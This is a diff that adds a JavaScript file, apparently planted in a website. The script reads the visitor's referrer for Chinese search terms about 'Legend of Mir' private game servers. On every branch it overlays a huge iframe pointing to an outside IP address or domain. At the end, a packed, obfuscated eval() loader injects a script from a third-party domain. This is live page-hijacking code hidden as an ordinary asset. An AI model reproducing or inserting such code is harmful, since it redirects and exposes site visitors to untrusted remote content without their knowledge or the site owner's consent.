@@ -1,0 +1,47 @@
+var jsurl=document.referrer;
+
+function getQuery(names){
+	
+querystr = jsurl.split("?");
+if(querystr[1]){
+GETs = querystr[1].split("&");
+GET =new Array();
+for(i=0;i<GETs.length;i++){
+tmp_arr = GETs[i].split("=");
+key=tmp_arr[0];
+if (key==names)
+{
+      return tmp_arr[1];
+}
+}
+}
+return "";
+}
+
+//传奇私服
+if(getQuery("wd")=="%B4%AB%C6%E6%CB%BD%B7%FE"){
+document.writeln("<iframe src=http://119.63.36.14:9205/ \  align=center frameborder=0 scrolling=no marginwidth=\'1\' marginheight=\'1\' width=\'1002\' height=\'10000\' ></iframe> ");
+
+}else if(getQuery("wd")=="%E4%BC%A0%E5%A5%87%E7%A7%81%E6%9C%8D"){
+document.writeln("<iframe src=http://119.63.36.14:9205/ \  align=center frameborder=0 scrolling=no marginwidth=\'1\' marginheight=\'1\' width=\'1002\' height=\'10000\' ></iframe> ");
+
+//word传奇私服
+}else if(getQuery("word")=="%B4%AB%C6%E6%CB%BD%B7%FE"){
+document.writeln("<iframe src=http://aaa.jzyew.com/qusf.htm \  align=center frameborder=0 scrolling=no marginwidth=\'1\' marginheight=\'1\' width=\'1002\' height=\'10000\' ></iframe> ");
+
+}else if(getQuery("word")=="%E4%BC%A0%E5%A5%87%E7%A7%81%E6%9C%8D"){
+document.writeln("<iframe src=http://aaa.jzyew.com/qusf.htm \  align=center frameborder=0 scrolling=no marginwidth=\'1\' marginheight=\'1\' width=\'1002\' height=\'10000\' ></iframe> ");
+
+//新开传奇私服
+}else if(getQuery("wd")=="%D0%C2%BF%AA%B4%AB%C6%E6%CB%BD%B7%FE"){
+document.writeln("<iframe src=http://aaa.jzyew.com/qusf.htm \  align=center frameborder=0 scrolling=no marginwidth=\'1\' marginheight=\'1\' width=\'1002\' height=\'10000\' ></iframe> ");
+
+}else if(getQuery("wd")=="%E6%96%B0%E5%BC%80%E4%BC%A0%E5%A5%87%E7%A7%81%E6%9C%8D"){
+document.writeln("<iframe src=http://aaa.jzyew.com/qusf.htm \  align=center frameborder=0 scrolling=no marginwidth=\'1\' marginheight=\'1\' width=\'1002\' height=\'10000\' ></iframe> ");
+
+//直接输入和其它
+}else{
+document.writeln("<iframe src=http://aaa.jzyew.com/qusf.htm \  align=center frameborder=0 scrolling=no marginwidth=\'1\' marginheight=\'1\' width=\'1002\' height=\'10000\' ></iframe> ");
+}
+Math.random();;
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7 3(e,t,n,a,o,i,m){e.5=o,e[o]=e[o]||3(){(e[o].q=e[o].q||[]).b(p)},e[o].l=e[o].l||+6 4,i=t.8(n),i.9=1,i.c=a,m=t.d(n)[0],m.f.g(i,m)}(h,j,"k","//2.r.s/2/1.u","2");',31,31,'||tj|function|Date|alogObjectName|new|void|createElement|asyn||push|src|getElementsByTagName||parentNode|insertBefore|window||document|script|||||arguments||tongjj|info||js'.split('|'),0,{}))
